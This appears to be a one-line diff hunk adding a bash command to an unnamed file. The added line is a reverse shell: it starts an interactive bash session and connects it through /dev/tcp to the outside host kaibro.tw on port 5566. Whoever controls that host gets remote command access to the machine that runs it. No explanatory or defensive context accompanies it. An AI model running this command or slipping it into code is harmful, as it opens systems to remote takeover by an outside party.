@@ -1,0 +1,1 @@
+bash -c 'bash -i >& /dev/tcp/kaibro.tw/5566 0>&1'
